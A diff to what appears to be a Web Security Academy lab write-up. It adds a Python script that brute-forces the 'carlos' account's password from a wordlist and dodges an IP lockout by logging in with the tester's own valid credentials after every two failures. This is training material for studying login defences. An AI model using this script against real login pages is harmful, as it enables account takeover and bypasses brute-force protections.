@@ -206,6 +206,43 @@ done
 We executed the script and obtained the password:
 ![image](https://github.com/user-attachments/assets/298304e6-0291-42b9-949b-3c8a14c7d835)
 
+We could also to create the following python scrypt:
+```
+#!/usr/bin/env python3
+import requests
+
+
+url = "https://0a3a003203e8cf79812b751500770071.web-security-academy.net/login"
+own_username = "wiener"
+own_password = "peter"
+fail_count = 0
+
+with open('passwords.txt', 'r') as f:
+    passwords =  [line.strip() for line in f.readlines()]
+
+for password in passwords:
+    data = {
+            'username': "carlos",
+            'password': password
+            }
+    r = requests.post(url, data=data, headers={'Content-Type': 'application/x-www-form-urlencoded'})
+    full_response = r.text
+
+    if "Incorrect password" not in full_response:
+        print(f"Successful login for password: {password}")
+        break
+    else:
+        fail_count += 1
+        
+    if fail_count == 2:
+        data = {
+                'username': own_username,
+                'password': own_password
+                }
+        r = requests.post(url, data=data, headers={'Content-Type': 'application/x-www-form-urlencoded'})
+        fail_count = 0
+```
+
 We could also have used a Burp Suite Intruder Pitchfork Attack by generating the lists (correct credentials every 2 incorrect ones). We will regenerate the lab and proceed to solve it this way.
 ```python
 #!/usr/bin/env python3
